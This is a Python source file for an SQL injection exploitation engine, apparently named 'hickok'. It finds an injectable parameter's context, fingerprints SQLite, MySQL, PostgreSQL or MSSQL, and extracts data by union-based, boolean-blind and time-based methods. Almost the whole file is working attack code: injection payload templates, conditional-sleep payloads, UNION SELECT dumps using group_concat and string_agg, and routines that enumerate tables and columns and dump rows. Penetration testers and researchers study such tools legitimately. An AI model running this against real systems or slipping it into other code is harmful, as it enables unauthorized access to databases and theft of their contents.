"""SQL injection exploitation engine — walk a database through an injectable point.

Given an injectable parameter, hickok calibrates the injection, fingerprints the
DBMS, and reads the database out with whichever technique fits:

  * union      — output is reflected: read whole values (and whole tables, via
                 group_concat) in a single request.
  * boolean    — only the page changes: binary-search each character through a
                 TRUE/FALSE oracle (error-forcing when a false page barely moves).
  * time-based — nothing leaks: ask through a conditional sleep and time it.

Enough to fingerprint, enumerate tables/columns and dump rows. Dependency-free
(urllib).
"""

from __future__ import annotations

import difflib
import html as _html
import re
import time
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

# Injection contexts: how to wrap an arbitrary boolean condition C around the
# parameter's normal value V. The right one is found by calibration.
_CONTEXTS = [
    # Plain boolean — works when a false condition visibly changes the page.
    ("numeric",       "{v} AND ({c})-- -"),
    ("single-quote",  "{v}' AND ({c})-- -"),
    ("double-quote",  "{v}\" AND ({c})-- -"),
    ("paren-single",  "{v}') AND ({c})-- -"),
    # Error-forcing — a false condition divides by zero, so even when the page
    # barely changes on a false row, true (page) vs false (error) is night & day.
    ("numeric/error", "{v} AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
    ("single/error",  "{v}' AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
]

# DBMS detection — a condition true only on that engine.
_FINGERPRINT = [
    ("sqlite",   "sqlite_version() IS NOT NULL"),
    ("mysql",    "@@version_comment IS NOT NULL"),
    ("mssql",    "@@servername IS NOT NULL"),
    ("postgres", "(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"),
]

# Per-DBMS query fragments. {q}=a sub-SELECT, {i}=1-based char index, {t}=table,
# {c}=column, {k}=0-based row offset. Each "*_at" returns the k-th item so the
# engine can page through lists; counts bound the loops.
_PROFILES = {
    "sqlite": {
        "charcode": "unicode(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "sqlite_version()",
        "user":     "''",
        "db":       "'main'",
        "tables_n": "(SELECT count(*) FROM sqlite_master WHERE type='table')",
        "table_at": "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM pragma_table_info('{t}'))",
        "col_at":   "(SELECT name FROM pragma_table_info('{t}') LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mysql": {
        "charcode": "ascii(substring(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "@@version",
        "user":     "current_user()",
        "db":       "database()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema=database())",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database())",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database() LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "postgres": {
        "charcode": "ascii(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "version()",
        "user":     "current_user",
        "db":       "current_database()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema='public')",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mssql": {
        "charcode": "unicode(substring(({q}),{i},1))",
        "length":   "len(({q}))",
        "version":  "@@version",
        "user":     "system_user",
        "db":       "db_name()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables)",
        "table_at": "(SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
    },
}


def _inject(http, url: str, param: str, value: str) -> str:
    """Send the request with `param` set to `value`; return the response body."""
    parts = urlsplit(url)
    q = {k: v[0] for k, v in parse_qs(parts.query, keep_blank_values=True).items()}
    q[param] = value
    return http.get(urlunsplit(parts._replace(query=urlencode(q))))


class Oracle:
    """A yes/no question to the database: ask(condition) -> True/False."""

    def __init__(self, http, url, param, value, template, context, true_text, false_text, console=None):
        self.http = http
        self.url, self.param, self.value = url, param, value
        self.template, self.context = template, context
        self._true, self._false = true_text, false_text
        self.console = console

    @property
    def count(self):
        return self.http.count

    def ask(self, condition: str) -> bool:
        payload = self.template.format(v=self.value, c=condition)
        if self.console is not None and self.console.verbose >= 2:
            self.console.trace(f"{self.param}={payload}", level=2)
        body = _inject(self.http, self.url, self.param, payload)
        return (difflib.SequenceMatcher(None, body, self._true).ratio()
                >= difflib.SequenceMatcher(None, body, self._false).ratio())


def _sim(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


def calibrate(http, url, param, value, console=None):
    """Find an injection context where TRUE and FALSE give different responses."""
    for context, tmpl in _CONTEXTS:
        t = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
        f = _inject(http, url, param, tmpl.format(v=value, c="1=2"))
        if t and _sim(t, f) < 0.95:                 # the condition visibly moves the page
            o = Oracle(http, url, param, value, tmpl, context, t, f, console)
            if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
                return o
    return None


# --- time-based blind: the universal fallback (works when nothing leaks) ----
# Conditional sleep per DBMS — sleeps {n}s only when ({c}) is true.
_SLEEP = {
    "mysql":    "{v}{q} AND IF(({c}),SLEEP({n}),0){cm}",
    "postgres": "{v}{q} AND 1=(CASE WHEN ({c}) THEN (SELECT 1 FROM pg_sleep({n})) ELSE 1 END){cm}",
    "mssql":    "{v}{q};IF(({c})) WAITFOR DELAY '0:0:{n}'{cm}",
    "sqlite":   "{v}{q} AND (CASE WHEN ({c}) THEN sleep({n}) ELSE 0 END)=0{cm}",  # lab only
}


class TimeOracle:
    """A yes/no question answered by the response *time*: a true condition sleeps."""

    def __init__(self, http, url, param, value, dbms, quote, n, threshold, console=None):
        self.http, self.url, self.param, self.value = http, url, param, value
        self.dbms, self.quote, self.n, self.threshold = dbms, quote, n, threshold
        self.context = f"{dbms}/time"
        self.console = console
        self.template = _SLEEP[dbms]

    @property
    def count(self):
        return self.http.count

    def ask(self, condition: str) -> bool:
        payload = self.template.format(v=self.value, q=self.quote, c=condition, n=self.n, cm=_COMMENT)
        if self.console is not None and self.console.verbose >= 2:
            self.console.trace(f"{self.param}={payload}", level=2)
        t0 = time.monotonic()
        _inject(self.http, self.url, self.param, payload)
        return (time.monotonic() - t0) >= self.threshold


def time_calibrate(http, url, param, value, n=2, console=None):
    """Find a DBMS+context whose conditional sleep visibly delays the response."""
    samples = []
    for _ in range(3):
        t0 = time.monotonic()
        _inject(http, url, param, value)
        samples.append(time.monotonic() - t0)
    base, jitter = min(samples), max(samples) - min(samples)
    if jitter > n * 0.5:                      # too noisy to time reliably
        return None
    threshold = base + n * 0.6
    for dbms, tmpl in _SLEEP.items():
        for q in ("", "'", '"'):
            t0 = time.monotonic()
            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=1", n=n, cm=_COMMENT))
            if (time.monotonic() - t0) < threshold:
                continue                      # true didn't delay -> wrong dbms/context
            t0 = time.monotonic()             # confirm a false condition stays fast
            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=2", n=n, cm=_COMMENT))
            if (time.monotonic() - t0) < threshold:
                return TimeOracle(http, url, param, value, dbms, q, n, threshold, console)
    return None


def _quote_for(context: str) -> str:
    """The string-breakout quote implied by a calibrated context."""
    if context.startswith("single"):
        return "'"
    if context.startswith("double"):
        return '"'
    if context.startswith("paren"):
        return "')"
    return ""                                # numeric


def fingerprint(oracle) -> str:
    for name, cond in _FINGERPRINT:
        if oracle.ask(cond):
            return name
    return "sqlite"        # safe fallback (ANSI-ish)


def extract_int(oracle, expr, cap=1 << 21) -> int:
    """The integer value of a SQL expression, by binary search on `>`/`>=`."""
    hi = 1
    while hi < cap and oracle.ask(f"({expr}) > {hi}"):
        hi <<= 1
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.ask(f"({expr}) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo


def extract_str(oracle, prof, subquery, maxlen=256) -> str:
    """The string value of a sub-SELECT, one character at a time."""
    n = min(extract_int(oracle, prof["length"].format(q=subquery)), maxlen)
    out = []
    for i in range(1, n + 1):
        code = extract_int(oracle, prof["charcode"].format(q=subquery, i=i))
        out.append(chr(code) if code else "?")
    return "".join(out)


def _list(oracle, prof, count_expr, at_tmpl, **fmt):
    n = extract_int(oracle, count_expr.format(**fmt))
    return [extract_str(oracle, prof, at_tmpl.format(k=k, **fmt)) for k in range(n)]


def tables(oracle, prof):
    return _list(oracle, prof, prof["tables_n"], prof["table_at"])


def columns(oracle, prof, table):
    return _list(oracle, prof, prof["cols_n"], prof["col_at"], t=table)


def dump(oracle, prof, table, cols, limit=20):
    rows_n = min(extract_int(oracle, prof["rows_n"].format(t=table)), limit)
    rows = []
    for k in range(rows_n):
        rows.append([extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols])
    return rows


# ============================ union-based ===============================
# When the injection point reflects query output, UNION SELECT reads whole
# values (and whole tables, via group_concat) in *one* request instead of
# binary-searching each character — orders of magnitude faster than blind.

_COMMENT = "-- -"          # the comment that swallows the rest of the original query
_UMARK = "hKx9q"           # delimiter wrapped around extracted data
_UROWSEP = "~r0w~"
_UCOLSEP = "~c0l~"

# Catalog sources per DBMS: "<column> FROM <rest>".
_UFROM = {
    "sqlite":   {"tables": "name FROM sqlite_master WHERE type='table'",
                 "cols":   "name FROM pragma_table_info('{t}')"},
    "mysql":    {"tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database()"},
    "postgres": {"tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
    "mssql":    {"tables": "table_name FROM information_schema.tables",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
}


def _ucat(dbms, parts):
    if dbms == "mysql":
        return "concat(" + ",".join(parts) + ")"
    return "(" + ("+" if dbms == "mssql" else "||").join(parts) + ")"


def _uagg(dbms, expr):
    if dbms == "mysql":
        return f"group_concat({expr} SEPARATOR '{_UROWSEP}')"
    if dbms == "sqlite":
        return f"group_concat({expr},'{_UROWSEP}')"
    return f"string_agg(cast({expr} as varchar(4000)),'{_UROWSEP}')"   # postgres / mssql


def union_setup(http, oracle):
    """Find the column count (ORDER BY) and a reflected column, or None."""
    q = _quote_for(oracle.context)
    base = _inject(http, oracle.url, oracle.param, oracle.value)
    ncols = 0
    for n in range(1, 16):
        r = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY {n}{_COMMENT}")
        if _sim(r, base) >= 0.95:
            ncols = n
        else:
            break
    if not ncols:
        return None
    marks = [f"{_UMARK}{i}z" for i in range(ncols)]
    sel = ",".join(f"'{m}'" for m in marks)
    r = _html.unescape(_inject(http, oracle.url, oracle.param,
                               f"{oracle.value}{q} AND 1=2 UNION SELECT {sel}{_COMMENT}"))
    refcol = next((i for i, m in enumerate(marks) if m in r), None)
    return (ncols, refcol) if refcol is not None else None


def union_value(http, oracle, dbms, ncols, refcol, expr):
    """Extract one SQL expression's value in a single request."""
    inner = f"({expr})"
    if dbms in ("mssql", "postgres"):
        inner = f"cast({inner} as varchar(4000))"
    cols = ["NULL"] * ncols
    cols[refcol] = _ucat(dbms, [f"'{_UMARK}'", inner, f"'{_UMARK}'"])
    q = _quote_for(oracle.context)
    payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
    body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
    m = re.search(re.escape(_UMARK) + "(.*?)" + re.escape(_UMARK), body, re.S)
    return m.group(1) if m else ""


def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
    col, _, frm = _UFROM[dbms][which].format(**fmt).partition(" FROM ")
    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
    return [x for x in data.split(_UROWSEP) if x]


def union_tables(http, oracle, dbms, ncols, refcol):
    return _union_list(http, oracle, dbms, ncols, refcol, "tables")


def union_columns(http, oracle, dbms, ncols, refcol, table):
    return _union_list(http, oracle, dbms, ncols, refcol, "cols", t=table)


def union_dump(http, oracle, dbms, ncols, refcol, table, cols):
    parts = []
    for i, c in enumerate(cols):
        if i:
            parts.append(f"'{_UCOLSEP}'")
        parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
    row = _ucat(dbms, parts)
    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {table}")
    return [r.split(_UCOLSEP) for r in data.split(_UROWSEP) if r]
